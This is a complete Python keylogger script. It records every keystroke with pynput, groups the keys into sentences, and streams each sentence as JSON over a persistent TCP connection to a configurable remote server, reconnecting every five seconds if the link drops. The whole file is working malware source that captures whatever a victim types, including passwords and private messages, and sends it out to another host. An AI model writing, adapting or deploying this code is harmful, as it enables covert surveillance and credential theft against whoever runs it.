import socket
import logging
import json
from pynput import keyboard
import time

# Logging configuration
logging.basicConfig(
    filename="keylogger.log",
    level=logging.DEBUG,
    format="%(asctime)s - %(levelname)s - %(message)s",
)

# Remote server details
SERVER_IP = "10.0.0.187"  # Replace with your server's IP address
SERVER_PORT = 5555
client_socket = None

# Buffer to store keystrokes
sentence_buffer = []


def connect_to_server():
    """Establish a persistent connection to the server."""
    global client_socket
    while client_socket is None:
        try:
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.connect((SERVER_IP, SERVER_PORT))
            logging.info(f"Connected to server at {SERVER_IP}:{SERVER_PORT}")
        except Exception as e:
            logging.error(f"Failed to connect to server: {e}")
            client_socket = None
            logging.info("Retrying connection in 5 seconds...")
            time.sleep(5)  # Retry every 5 seconds


def send_to_server(data):
    """Send keystroke data to the server."""
    global client_socket
    if client_socket is None:
        connect_to_server()
    if client_socket:
        try:
            json_data = json.dumps(data) + "\n"
            client_socket.sendall(json_data.encode())
            logging.info(f"Sent to server: {data}")
        except Exception as e:
            logging.error(f"Error sending data to server: {e}")
            client_socket = None  # Reset the socket to reconnect later


def on_key_press(key):
    """Handle key press events."""
    global sentence_buffer

    try:
        if hasattr(key, "char") and key.char is not None:
            # Add printable characters to the buffer
            sentence_buffer.append(key.char)
        elif key == keyboard.Key.space:
            # Add a space to the buffer
            sentence_buffer.append(" ")
        elif key == keyboard.Key.enter:
            # Send the sentence to the server
            sentence = "".join(sentence_buffer).strip()
            if sentence:
                send_to_server({"field": "keystroke", "value": sentence})
                logging.info(f"Captured sentence: {sentence}")
            sentence_buffer.clear()  # Clear the buffer
        elif key == keyboard.Key.backspace:
            # Handle backspace
            if sentence_buffer:
                sentence_buffer.pop()
        else:
            # Log special keys
            logging.info(f"Special key pressed: {key}")

    except Exception as e:
        logging.error(f"Error in on_key_press: {e}")


def start_keylogging():
    """Start the keylogger."""
    connect_to_server()
    with keyboard.Listener(on_press=on_key_press) as listener:
        listener.join()


if __name__ == "__main__":
    logging.info("Starting keylogger...")
    try:
        start_keylogging()
    except KeyboardInterrupt:
        logging.info("Keylogger stopped.")
    finally:
        if client_socket:
            client_socket.close()
